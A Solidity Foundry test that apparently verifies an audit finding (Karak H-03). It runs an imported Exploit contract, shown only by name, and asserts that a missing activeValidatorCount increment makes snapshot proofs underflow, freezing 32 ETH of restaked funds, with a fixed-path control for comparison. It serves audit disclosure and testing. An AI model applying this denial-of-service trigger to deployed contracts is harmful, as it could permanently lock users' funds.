// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, NativeVault, MarkerToken} from "./38491-h-03-activevalidatorcount-is-never-set-or-increased-pashov-a.sol";

// Karak H-03 (finding 38491): NativeVaultLib.validateWithdrawalCredentials never
// increments activeValidatorCount, so _startSnapshot seeds remainingProofs = 0 and
// the verbatim `snapshot.remainingProofs--` in validateSnapshotProofs underflows on
// the first proof (Panic 0x11). A node with registered validators can never finalize
// a snapshot -> its restaked ETH accounting is permanently bricked (DoS). A control
// node using the fixed path completes its snapshot, isolating the missing increment.
contract Finding38491Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_missingActiveValidatorCount_bricksSnapshot() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("victim activeValidatorCount (bug -> 0)", e.victimActiveCount());
        emit log_named_uint("control activeValidatorCount (fixed -> 1)", e.controlActiveCount());
        emit log_named_uint("victim snapshot proof reverted underflow (1=yes)", e.dosConfirmed() ? 1 : 0);
        emit log_named_uint("control snapshot completed (1=yes)", e.controlSucceeded() ? 1 : 0);
        emit log_named_uint("frozen restaked ETH (wei)", e.frozenWei());
        emit log_named_uint("harm marked at sink", e.sinkHarm());

        // bug: the registered validator is never counted
        assertEq(e.victimActiveCount(), 0, "activeValidatorCount must stay 0 under the bug");
        // harm: submitting a balance proof reverts with an arithmetic underflow (DoS)
        assertTrue(e.dosConfirmed(), "validateSnapshotProofs must revert with remainingProofs underflow");
        // control proves the revert is caused precisely by the missing increment
        assertEq(e.controlActiveCount(), 1, "fixed path must count the validator");
        assertTrue(e.controlSucceeded(), "fixed path snapshot must complete");
        // frozen restaked ETH quantified at the SINK marker
        assertEq(e.frozenWei(), 32 ether, "32 ETH restaked can never be finalized");
        assertEq(e.sinkHarm(), 32 ether, "harm marker not at sink");
        assertEq(e.marker().balanceOf(SINK), 32 ether, "sink marker mismatch");
    }
}
